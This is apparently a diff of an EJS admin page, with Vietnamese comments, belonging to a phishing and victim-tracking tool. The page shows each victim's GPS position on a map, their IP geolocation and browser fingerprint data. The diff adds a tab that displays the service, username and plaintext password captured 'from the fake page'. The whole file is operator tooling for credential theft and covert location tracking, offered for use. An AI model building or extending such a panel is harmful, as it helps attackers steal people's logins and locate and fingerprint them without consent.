@@ -27,20 +27,24 @@
 
 <!-- HỆ THỐNG TAB -->
 <div id="tabs">
+    <!-- NÚT ĐIỀU KHIỂN CÁC TAB -->
     <div role="tablist">
         <button role="tab" aria-selected="true" aria-controls="location-panel">Thông tin Vị trí</button>
         <button role="tab" aria-selected="false" aria-controls="fp-panel">Dấu vân tay Trình duyệt</button>
+        <!-- THÊM NÚT TAB MỚI - CHỈ HIỂN THỊ KHI CÓ DỮ LIỆU -->
+        <% if (visit.Credential) { %>
+            <button role="tab" aria-selected="false" aria-controls="credential-panel" style="color: var(--pico-color-amber-500);">
+                <span style="vertical-align: middle;">🔒</span> Thông tin Thu thập
+            </button>
+        <% } %>
     </div>
     
-    <!-- ================== TAB VỊ TRÍ ================== -->
+    <!-- PANEL 1: TAB VỊ TRÍ -->
     <div role="tabpanel" id="location-panel">
-        
         <div id="map-container" style="height: 400px; width: 100%; margin-top: 1rem; border-radius: var(--border-radius); background-color: var(--pico-muted-background-color);">
              <progress style="position: relative; top: 45%;"></progress>
         </div>
-        
         <div class="grid" style="margin-top: 2rem;">
-            
             <% if (visit.latitude && visit.longitude) { %>
                 <article>
                     <header><strong style="color: var(--pico-color-green-400);">📍 Vị trí GPS (Chính xác)</strong></header>
@@ -51,22 +55,25 @@
                     </ul>
                 </article>
             <% } %>
-
             <article id="ip-info-article">
                 <header><strong>ℹ️ Vị trí IP (Ước tính)</strong></header>
                 <div id="ip-info-content"><progress></progress></div>
             </article>
-
         </div>
     </div>
     
-    <!-- ================== TAB FINGERPRINT ================== -->
+    <!-- PANEL 2: TAB DẤU VÂN TAY TRÌNH DUYỆT -->
     <div role="tabpanel" id="fp-panel" hidden>
         <h4>Các thành phần tạo nên Dấu vân tay Trình duyệt</h4>
         <p>Đây là tất cả các thông tin mà trình duyệt của khách truy cập đã cung cấp để tạo ra một định danh duy nhất.</p>
         <div class="overflow-auto">
             <table>
-                <thead><tr><th>Thành phần</th><th>Giá trị</th></tr></thead>
+                <thead>
+                    <tr>
+                        <th>Thành phần</th>
+                        <th>Giá trị</th>
+                    </tr>
+                </thead>
                 <tbody>
                     <% if (visit.fingerprintComponents && Object.keys(visit.fingerprintComponents).length > 0) { %>
                         <% Object.entries(visit.fingerprintComponents).forEach(([key, component]) => { %>
@@ -76,7 +83,7 @@
                                     <% if (typeof component.value === 'object' && component.value !== null) { %>
                                         <pre><code style="font-size: 0.9em; white-space: pre-wrap;"><%- JSON.stringify(component.value, null, 2).replace(/</g, "<").replace(/>/g, ">") %></code></pre>
                                     <% } else { %>
-                                        <code style="word-break: break-all;"><%= component.value %></code>
+                                        <code style="word-break: break-all;"><%- String(component.value).replace(/</g, "<").replace(/>/g, ">") %></code>
                                     <% } %>
                                 </td>
                             </tr>
@@ -91,11 +98,38 @@
              <a href="#" role="button" onclick="downloadFingerprintComponents(event)" class="secondary">Tải xuống Dữ liệu Fingerprint (JSON)</a>
         </footer>
     </div>
+
+    <!-- PANEL 3: TAB THÔNG TIN THU THẬP ĐƯỢC (MỚI) -->
+    <% if (visit.Credential) { %>
+        <div role="tabpanel" id="credential-panel" hidden>
+            <h4 style="color: var(--pico-color-red-500);">⚠️ Cảnh báo: Dữ liệu nhạy cảm</h4>
+            <p>Đây là thông tin đăng nhập đã được thu thập từ trang giả mạo.</p>
+            <article>
+                <div class="grid">
+                    <div>
+                        <strong>Dịch vụ:</strong>
+                        <p><code><%= visit.Credential.service %></code></p>
+                    </div>
+                    <div>
+                        <strong>Tên đăng nhập (Email/SĐT):</strong>
+                        <p><code><%= visit.Credential.username %></code></p>
+                    </div>
+                </div>
+                <hr>
+                <div>
+                    <strong>Mật khẩu:</strong>
+                    <p><code style="font-size: 1.2rem; color: var(--pico-color-amber-400);"><%= visit.Credential.password %></code></p>
+                </div>
+            </article>
+        </div>
+    <% } %>
 </div>
 
+<!-- SCRIPT VÀ CSS CHO BẢN ĐỒ -->
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
+<!-- SCRIPT LOGIC CỦA TRANG -->
 <script>
     // --- KHAI BÁO BIẾN JAVASCRIPT AN TOÀN TỪ DỮ LIỆU EJS ---
     const VISIT_IP_ADDRESS = <%- JSON.stringify(visit.ipAddress) %>;
@@ -103,86 +137,78 @@
     const GPS_LAT = <%- visit.latitude || 'null' %>;
     const GPS_LON = <%- visit.longitude || 'null' %>;
     const GPS_ACCURACY = <%- visit.gpsAccuracy || 'null' %>;
+    const FINGERPRINT_ID = <%- JSON.stringify(visit.fingerprintId) %>;
+    const FINGERPRINT_DATA = <%- JSON.stringify(visit.fingerprintComponents || {}) %>;
 
-    // --- SCRIPT CHUNG CHO TAB VÀ DOWNLOAD ---
+    // --- LOGIC TAB ---
     const tabs = document.querySelectorAll('[role="tab"]');
+    const tabPanels = document.querySelectorAll('[role="tabpanel"]');
     tabs.forEach(tab => {
         tab.addEventListener('click', (e) => {
             tabs.forEach(t => t.setAttribute('aria-selected', 'false'));
-            const panelId = e.currentTarget.getAttribute('aria-controls');
             e.currentTarget.setAttribute('aria-selected', 'true');
-            document.querySelectorAll('[role="tabpanel"]').forEach(p => p.hidden = true);
+            const panelId = e.currentTarget.getAttribute('aria-controls');
+            tabPanels.forEach(p => p.hidden = true);
             document.getElementById(panelId).hidden = false;
         });
     });
 
+    // --- LOGIC DOWNLOAD ---
     function downloadFingerprintComponents(event){
       event.preventDefault();
-      const jsonData = <%- JSON.stringify(visit.fingerprintComponents || {}, null, 2) %>;
-      const blob = new Blob([JSON.stringify(jsonData, null, 2)], { type: 'application/json' });
+      const blob = new Blob([JSON.stringify(FINGERPRINT_DATA, null, 2)], { type: 'application/json' });
       const url = URL.createObjectURL(blob);
       const a = document.createElement('a');
       a.href = url;
-      a.download = `fingerprint_details_<%- visit.fingerprintId %>.json`;
+      a.download = `fingerprint_details_${FINGERPRINT_ID}.json`;
       document.body.appendChild(a);
       a.click();
       document.body.removeChild(a);
       URL.revokeObjectURL(url);
     }
     
-    // --- HÀM LOGIC CHÍNH ĐỂ HIỂN THỊ DỮ LIỆU ---
+    // --- LOGIC HIỂN THỊ DỮ LIỆU VỊ TRÍ ---
     async function initializeLocationData() {
         const ipInfo = await fetchIpDetails();
-        
         if (HAS_GPS) {
             drawMap(GPS_LAT, GPS_LON, GPS_ACCURACY, 16, 'Vị trí GPS chính xác');
-        } else if (ipInfo) {
+        } else if (ipInfo && ipInfo.lat && ipInfo.lon) {
             drawMap(ipInfo.lat, ipInfo.lon, 0, 13, 'Vị trí ước tính từ IP');
         } else {
              document.getElementById('map-container').innerHTML = '<p class="toast error">Không thể tải dữ liệu bản đồ.</p>';
         }
     }
-
-    // Hàm con: Gọi và xử lý API chi tiết IP
+    
     async function fetchIpDetails() {
         const ipInfoContainer = document.getElementById('ip-info-content');
         try {
-            // ---- FIX LỖI Ở ĐÂY: DÙNG BIẾN JAVASCRIPT ĐÃ KHAI BÁO ----
             const response = await fetch(`/ip-details/${VISIT_IP_ADDRESS}`);
             const data = await response.json();
-            
             if (data.status === 'success') {
-                 ipInfoContainer.innerHTML = `
-                    <ul>
-                        <li><strong>Địa chỉ IP:</strong> <code>${VISIT_IP_ADDRESS}</code></li>
-                        <li><strong>Quốc gia:</strong> ${data.country || 'N/A'} (${data.countryCode || 'N/A'})</li>
-                        <li><strong>Thành phố/Vùng:</strong> ${data.city || 'N/A'}, ${data.regionName || 'N/A'}</li>
-                        <li><strong>Nhà mạng (ISP):</strong> ${data.isp || 'N/A'}</li>
-                        <li><strong>Tổ chức:</strong> ${data.org || 'N/A'}</li>
-                    </ul>`;
+                 ipInfoContainer.innerHTML = `<ul><li><strong>Địa chỉ IP:</strong> <code>${VISIT_IP_ADDRESS}</code></li><li><strong>Quốc gia:</strong> ${data.country || 'N/A'} (${data.countryCode || 'N/A'})</li><li><strong>Thành phố/Vùng:</strong> ${data.city || 'N/A'}, ${data.regionName || 'N/A'}</li><li><strong>Nhà mạng (ISP):</strong> ${data.isp || 'N/A'}</li><li><strong>Tổ chức:</strong> ${data.org || 'N/A'}</li></ul>`;
                 return data;
             } else { throw new Error(data.message); }
         } catch (error) {
-            ipInfoContainer.innerHTML = `<p style="color: var(--pico-color-red-500);">Lỗi tải thông tin IP: ${error.message}</p>`;
+            ipInfoContainer.innerHTML = `<p style="color: var(--pico-color-red-500);">Lỗi tải thông tin IP.</p>`;
             return null;
         }
     }
 
-    // Hàm con: Vẽ bản đồ
     function drawMap(lat, lon, accuracy, zoom, popupText) {
         const mapContainer = document.getElementById('map-container');
         try {
             const map = L.map(mapContainer).setView([lat, lon], zoom);
-            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OpenStreetMap' }).addTo(map);
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OpenStreetMap contributors' }).addTo(map);
             L.marker([lat, lon]).addTo(map).bindPopup(popupText).openPopup();
             if (accuracy > 0) {
                 L.circle([lat, lon], { radius: accuracy, color: '#1095c1', fillColor: '#1095c1', fillOpacity: 0.2 }).addTo(map);
             }
-        } catch(e){
+        } catch(e) {
             mapContainer.innerHTML = `<p class="toast error">Không thể khởi tạo bản đồ. Dữ liệu tọa độ không hợp lệ.</p>`;
         }
     }
-
+    
+    // Chạy hàm chính khi trang tải xong
     document.addEventListener('DOMContentLoaded', initializeLocationData);
 </script>
 
